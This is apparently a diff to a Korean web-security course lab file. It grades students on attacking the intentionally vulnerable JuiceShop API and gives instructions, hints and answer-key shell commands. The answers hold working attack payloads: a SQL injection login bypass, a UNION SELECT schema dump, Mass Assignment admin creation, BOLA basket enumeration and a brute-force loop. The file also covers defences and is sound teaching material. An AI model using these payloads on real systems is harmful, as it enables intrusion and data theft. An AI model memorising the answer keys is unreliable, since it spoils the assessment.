@@ -3,89 +3,122 @@ title: "API 보안 취약점 실습"
 version: "non-ai"
 course: "web-vuln-nonai"
 week: 12
-description: "REST API의 인증 우회, 과도한 데이터 노출, Mass Assignment 등 OWASP API Top 10 취약점을 실습합니다."
+description: "JuiceShop의 REST API를 대상으로 인증 우회, 과도한 데이터 노출, Mass Assignment, Rate Limiting 부재 등 OWASP API Top 10 취약점을 실습합니다."
 difficulty: "hard"
 duration_minutes: 120
 objectives:
-  - "API 보안 취약점 유형을 이해한다"
-  - "인증 우회 및 과도한 데이터 노출을 실습한다"
-  - "Mass Assignment 공격을 시도한다"
+  - "OWASP API Security Top 10 취약점을 이해한다"
+  - "API 인증/인가 취약점을 탐지하고 공격한다"
+  - "API Rate Limiting, 데이터 노출 등 설계 취약점을 분석한다"
 pass_threshold: 0.6
 steps:
   - order: 1
-    instruction: "JuiceShop(10.20.30.80:3000)의 API 엔드포인트를 열거하라. /api/ 경로 하위의 모든 리소스를 탐색하라."
-    hint: "curl -s http://10.20.30.80:3000/api/ 로 시작하고, Products, Users, Feedbacks 등을 확인하세요."
+    instruction: "JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색하라."
+    hint: "curl로 /api/Products, /api/Users, /api/Feedbacks, /api/Challenges, /api/Recycles, /rest/products/search, /rest/user/login 등을 순차적으로 요청하세요."
     category: "recon"
     points: 8
-    answer: "for ep in Products Users Feedbacks Challenges Recycles SecurityQuestions; do CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/api/$ep/ 2>/dev/null); echo \"$ep: $CODE\"; done"
-    answer_detail: "API 열거는 보안 점검의 첫 단계입니다. 200이면 접근 가능, 401이면 인증 필요, 404면 미존재 엔드포인트입니다. 인증 없이 접근 가능한 엔드포인트는 정보 유출 위험이 있습니다."
+    answer: "echo '=== JuiceShop API Endpoint Map ===' && for EP in api/Products api/Users api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search rest/user/login rest/track-order; do echo -n \"/$EP: \" && curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/$EP 2>/dev/null && echo ''; done && echo '=== API Mapping Complete ==='"
+    answer_detail: "API 엔드포인트 매핑은 API 보안 테스트의 기초입니다. 200(접근 가능), 401(인증 필요), 403(권한 부족), 404(미존재) 응답을 구분하여 공격 표면을 파악합니다. 인증 없이 200이 반환되는 엔드포인트가 첫 번째 공격 대상입니다."
     verify:
       type: "output_contains"
-      expect: "200"
+      expect: "API Mapping Complete"
       field: "stdout"
   - order: 2
-    instruction: "인증 없이 접근 가능한 API에서 과도한 데이터 노출(Excessive Data Exposure)을 확인하라. /api/Products/ 응답에서 불필요하게 노출되는 필드를 찾아라."
-    hint: "curl -s http://10.20.30.80:3000/api/Products/ | python3 -m json.tool로 전체 구조를 확인하세요."
+    instruction: "인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data Exposure)을 확인하라."
+    hint: "인증 토큰 없이 curl http://10.20.30.80:3000/api/Users/ 를 요청하세요. 응답에 패스워드 해시, 이메일 등 민감 정보가 포함되는지 확인합니다."
     category: "exploit"
-    points: 10
-    answer: "curl -s http://10.20.30.80:3000/api/Products/ 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',[{}])[0]; print('Exposed fields:', list(d.keys()))\" 2>/dev/null"
-    answer_detail: "API가 내부 필드(deletedAt, createdAt, updatedAt)까지 노출하면 데이터베이스 구조가 드러납니다. 클라이언트에 필요한 필드만 반환해야 합니다 (DTO 패턴)."
+    points: 12
+    answer: "curl -s http://10.20.30.80:3000/api/Users/ | python3 -c \"import sys,json; data=json.load(sys.stdin).get('data',[]); [print(f'User {u.get(\\\"id\\\")}: email={u.get(\\\"email\\\")}, role={u.get(\\\"role\\\",\\\"N/A\\\")}') for u in data[:5]]\" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/ | head -c 500"
+    answer_detail: "OWASP API #3 Excessive Data Exposure: API가 클라이언트가 필요한 것보다 많은 데이터를 반환합니다. 사용자 이메일, 패스워드 해시, createdAt 등의 민감 정보가 필터링 없이 노출되면, 공격자가 이를 크리덴셜 스터핑이나 소셜 엔지니어링에 활용할 수 있습니다."
     verify:
       type: "output_contains"
-      expect: "Exposed fields"
+      expect: "email"
       field: "stdout"
   - order: 3
-    instruction: "사용자 등록 API에서 Mass Assignment를 시도하라. 등록 시 role 필드를 추가하여 관리자 권한을 획득하라."
-    hint: "POST /api/Users/에 {\"email\":\"...\",\"password\":\"...\",\"role\":\"admin\"} 형태로 보내세요."
+    instruction: "Broken Object Level Authorization(BOLA) 취약점을 테스트하시오. 인증된 사용자 토큰으로 다른 사용자의 장바구니(/rest/basket/1, /rest/basket/2)에 접근하라."
+    hint: "SQL Injection으로 로그인한 후, Authorization 헤더로 다른 ID의 basket에 접근하세요."
     category: "exploit"
-    points: 15
-    answer: "curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"hacker@test.com\",\"password\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null"
-    answer_detail: "Mass Assignment는 클라이언트가 보낸 모든 필드를 서버가 맹목적으로 저장할 때 발생합니다. role=admin이 저장되면 권한 상승이 성공한 것입니다. ORM의 fillable/guarded 설정으로 방어합니다."
+    points: 12
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}' | grep -o '\"token\":\"[^\"]*\"' | cut -d'\"' -f4) && for i in 1 2 3; do echo \"=== Basket $i ===\" && curl -s http://10.20.30.80:3000/rest/basket/$i -H \"Authorization: Bearer $TOKEN\" -o /dev/null -w 'HTTP:%{http_code}' && echo ''; done"
+    answer_detail: "OWASP API #1 BOLA: API가 객체 수준의 권한 확인을 하지 않아, 다른 사용자의 리소스에 접근할 수 있습니다. basket/1, basket/2처럼 순차적 ID를 열거하면 모든 사용자의 장바구니를 조회할 수 있습니다."
     verify:
       type: "output_contains"
-      expect: "email="
+      expect: "Basket"
       field: "stdout"
   - order: 4
-    instruction: "API Rate Limiting이 적용되어 있는지 테스트하라. 같은 엔드포인트에 빠르게 50회 요청을 보내고 429(Too Many Requests) 응답이 오는지 확인하라."
-    hint: "for 루프로 50회 반복 요청하고 응답 코드를 수집하세요."
+    instruction: "Mass Assignment 공격을 수행하시오. 사용자 등록 API(/api/Users/)에 role과 isAdmin 필드를 추가하여 관리자 계정을 생성하라."
+    hint: "POST /api/Users/ 에 {\"email\":\"hacker@test.com\",\"password\":\"test1234\",\"role\":\"admin\",\"isAdmin\":true} 형태로 요청하세요."
     category: "exploit"
-    points: 10
-    answer: "for i in $(seq 1 50); do curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"a\",\"password\":\"b\"}' 2>/dev/null; done | sort | uniq -c | sort -rn"
-    answer_detail: "Rate Limiting이 없으면 Brute Force, Credential Stuffing 공격이 가능합니다. 429 응답이 나오면 Rate Limiting이 적용된 것, 모두 401이면 미적용입니다."
-    verify:
-      type: "output_regex"
-      expect: "401|429"
-      field: "stdout"
-  - order: 5
-    instruction: "REST API의 HTTP 메소드를 테스트하라. /api/Products/1에 GET, PUT, DELETE를 보내고 각 응답을 확인하라."
-    hint: "curl -X GET/PUT/DELETE로 각 메소드를 테스트하세요."
-    category: "exploit"
-    points: 10
-    answer: "for m in GET PUT DELETE OPTIONS; do CODE=$(curl -s -o /dev/null -w '%{http_code}' -X $m http://10.20.30.80:3000/api/Products/1 -H 'Content-Type: application/json' 2>/dev/null); echo \"$m: $CODE\"; done"
-    answer_detail: "API에서 불필요한 HTTP 메소드가 허용되면 데이터 수정/삭제가 가능합니다. GET만 허용해야 하는 엔드포인트에서 PUT/DELETE가 200을 반환하면 취약합니다."
+    points: 12
+    answer: "curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}' | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\"}'"
+    answer_detail: "OWASP API #6 Mass Assignment: 서버가 클라이언트 요청의 모든 필드를 그대로 모델에 바인딩하면, 공격자가 role, isAdmin 같은 숨겨진 필드를 추가하여 권한 상승을 할 수 있습니다. 응답에 role:admin이 반영되면 취약합니다."
     verify:
       type: "output_contains"
-      expect: "GET:"
+      expect: "email"
+      field: "stdout"
+  - order: 5
+    instruction: "Rate Limiting 부재를 확인하시오. 로그인 API에 잘못된 비밀번호로 20회 연속 요청을 보내 계정 잠금이나 속도 제한이 있는지 테스트하라."
+    hint: "for 루프로 curl -X POST /rest/user/login 에 잘못된 비밀번호를 반복 전송하세요."
+    category: "exploit"
+    points: 10
+    answer: "echo '=== Rate Limiting Test (20 attempts) ===' && for i in $(seq 1 20); do echo -n \"Attempt $i: \" && curl -s -o /dev/null -w '%{http_code}' -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"wrong_'\"$i\"'\"}' && echo ''; done | tail -5 && echo '=== Rate Limit Test Complete ==='"
+    answer_detail: "OWASP API #4 Lack of Resources & Rate Limiting: Rate Limiting이 없으면 브루트포스, 크리덴셜 스터핑 공격이 가능합니다. 20회 시도 후에도 429(Too Many Requests)가 발생하지 않으면 취약합니다."
+    verify:
+      type: "output_contains"
+      expect: "Rate Limit Test Complete"
       field: "stdout"
   - order: 6
-    instruction: "GraphQL 또는 Swagger 문서가 노출되는지 확인하라. /api-docs, /swagger.json, /graphql 경로를 탐색하라."
+    instruction: "Broken Function Level Authorization을 테스트하시오. 인증된 사용자 토큰으로 관리자 전용 HTTP 메서드(PUT, DELETE)에 접근하라."
+    hint: "curl -X GET/PUT/DELETE /api/Products/1 으로 각 메서드를 테스트하세요."
+    category: "exploit"
+    points: 12
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}' | grep -o '\"token\":\"[^\"]*\"' | cut -d'\"' -f4) && echo '=== Function Level Auth Test ===' && for METHOD in GET PUT DELETE OPTIONS; do echo -n \"$METHOD /api/Products/1: \" && curl -s -o /dev/null -w '%{http_code}' -X $METHOD http://10.20.30.80:3000/api/Products/1 -H 'Content-Type: application/json' -H \"Authorization: Bearer $TOKEN\" && echo ''; done && echo '=== Auth Test Complete ==='"
+    answer_detail: "OWASP API #5 Broken Function Level Authorization: 서버가 HTTP 메서드별로 권한을 구분하지 않으면, GET은 허용하지만 PUT/DELETE도 허용될 수 있습니다. 관리자 전용 기능(사용자 수정/삭제)에 일반 사용자가 접근 가능하면 심각한 취약점입니다."
+    verify:
+      type: "output_contains"
+      expect: "Auth Test Complete"
+      field: "stdout"
+  - order: 7
+    instruction: "SQL Injection을 통한 API 데이터 탈취를 수행하시오. /rest/products/search 엔드포인트에서 UNION SELECT로 데이터베이스 스키마를 추출하라."
+    hint: "q 파라미터에 test'))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master-- 형태의 페이로드를 넣으세요."
+    category: "exploit"
+    points: 12
+    answer: "curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | head -c 500"
+    answer_detail: "JuiceShop의 검색 API는 SQLite를 사용하며, 입력 검증이 없어 UNION SELECT로 다른 테이블의 데이터를 추출할 수 있습니다. sqlite_master 테이블에서 전체 스키마를 조회하면 Users, Cards 등의 민감 테이블 구조가 노출됩니다."
+    verify:
+      type: "output_contains"
+      expect: "data"
+      field: "stdout"
+  - order: 8
+    instruction: "API 응답 보안 헤더를 분석하시오. CORS 설정, X-Content-Type-Options, Cache-Control 등이 올바르게 설정되어 있는지 확인하라."
+    hint: "curl -I로 API 응답 헤더를 확인하세요. Access-Control-Allow-Origin이 *이면 모든 도메인에서 접근 가능합니다."
+    category: "defense"
+    points: 8
+    answer: "echo '=== API Security Headers ===' && curl -sI http://10.20.30.80:3000/api/Products/ | grep -iE '(access-control|x-content|cache-control|x-frame|strict-transport|content-security)' && echo '=== CORS Preflight ===' && curl -sI -X OPTIONS http://10.20.30.80:3000/api/Products/ -H 'Origin: http://evil.com' -H 'Access-Control-Request-Method: DELETE' | grep -iE '(access-control|allow)' && echo '=== Header Analysis Complete ==='"
+    answer_detail: "Access-Control-Allow-Origin: *는 모든 도메인에서 API를 호출할 수 있어 CSRF에 취약합니다. Cache-Control: no-store가 없으면 민감 데이터가 캐시됩니다. CORS는 허용 도메인을 명시적으로 지정해야 합니다."
+    verify:
+      type: "output_contains"
+      expect: "Header Analysis Complete"
+      field: "stdout"
+  - order: 9
+    instruction: "Swagger/OpenAPI 문서 노출 여부를 확인하시오. /api-docs, /swagger.json, /graphql 등의 문서 엔드포인트를 탐색하라."
     hint: "curl로 각 경로에 접근하여 200 응답이 오는지 확인하세요."
     category: "recon"
     points: 8
-    answer: "for path in /api-docs /swagger.json /graphql /.well-known/openapi.json /api-docs/swagger.json; do CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000$path 2>/dev/null); [ \"$CODE\" != \"404\" ] && echo \"$path: $CODE (EXPOSED)\"; done; echo 'Scan complete'"
-    answer_detail: "API 문서(Swagger/OpenAPI)가 프로덕션에서 노출되면 모든 엔드포인트, 파라미터, 인증 방법이 공격자에게 노출됩니다. 프로덕션에서는 비활성화해야 합니다."
+    answer: "echo '=== API Documentation Scan ===' && for PATH in /api-docs /swagger.json /graphql /.well-known/openapi.json /api-docs/swagger.json /v2/api-docs; do CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000$PATH 2>/dev/null); echo \"$PATH: $CODE\"; done && echo '=== Doc Scan Complete ==='"
+    answer_detail: "API 문서(Swagger/OpenAPI)가 프로덕션에서 노출되면 모든 엔드포인트, 파라미터, 인증 방법이 공격자에게 노출됩니다. GraphQL introspection이 활성화되면 전체 스키마가 노출됩니다. 프로덕션에서는 반드시 비활성화해야 합니다."
     verify:
       type: "output_contains"
-      expect: "Scan complete"
+      expect: "Doc Scan Complete"
       field: "stdout"
-  - order: 7
-    instruction: "API 보안 점검 결과를 /tmp/api_security_report.txt에 정리하라."
-    hint: "발견된 API 취약점과 방어 권고를 포함하세요."
+  - order: 10
+    instruction: "API 보안 종합 평가를 수행하시오. 발견된 OWASP API Top 10 취약점을 정리하고, 위험도를 평가하라."
+    hint: "BOLA, Excessive Data Exposure, Mass Assignment, Rate Limiting 부재 등을 종합 정리하세요."
     category: "reporting"
-    points: 8
-    answer: "cat > /tmp/api_security_report.txt << 'EOF'\n=== API 보안 진단 보고서 ===\n대상: JuiceShop API (10.20.30.80:3000)\n\nOWASP API Top 10 점검:\n1. Broken Authentication: Rate Limiting 미적용\n2. Excessive Data Exposure: 내부 필드 노출\n3. Mass Assignment: role 필드 주입 가능성\n4. BOLA (IDOR): 타인 리소스 접근 가능\n5. Security Misconfiguration: 불필요 메소드 허용\n\n방어:\n- 입력 검증 + 출력 필터링\n- Rate Limiting + 인증 강화\n- API Gateway + WAF\nEOF\ncat /tmp/api_security_report.txt"
-    answer_detail: "API 보안은 전통적 웹 보안과 다른 관점이 필요합니다. OWASP API Security Top 10은 BOLA, Broken Authentication, Excessive Data Exposure 등 API 특화 위협을 다룹니다."
+    points: 10
+    answer: "cat > /tmp/api_report.txt << 'EOF'\n=== API 보안 종합 평가 보고서 ===\n대상: JuiceShop API (10.20.30.80:3000)\n\n[CRITICAL]\nA1-BOLA: /rest/basket/{id} 열거로 타 사용자 장바구니 접근\nA3-SQLi: /rest/products/search UNION SELECT로 DB 스키마 탈취\n\n[HIGH]\nA3-Excessive Data Exposure: /api/Users/ 패스워드해시, 이메일 노출\nA6-Mass Assignment: role/isAdmin 필드 주입으로 권한 상승\nA5-BFLA: PUT/DELETE 메서드 권한 미검증\n\n[MEDIUM]\nA4-Rate Limiting 부재: 20회 브루트포스 차단 없음\nCORS 미설정: Access-Control-Allow-Origin 검증 부재\n\n[방어 권고]\n1. 모든 API에 객체 수준 권한 검증 (BOLA 방어)\n2. DTO 패턴으로 반환 필드 제한\n3. ORM fillable/guarded로 Mass Assignment 방어\n4. API Gateway에 Rate Limiting 적용\n5. Prepared Statement로 SQLi 방어\nEOF\ncat /tmp/api_report.txt"
+    answer_detail: "API 보안 평가는 OWASP API Security Top 10을 기준으로 체계적으로 수행합니다. BOLA(A1)와 Injection(A3)은 Critical, Excessive Data Exposure와 Mass Assignment는 High로 분류합니다."
     verify:
       type: "output_contains"
-      expect: "API 보안 진단 보고서"
+      expect: "API 보안 종합 평가 보고서"
       field: "stdout"
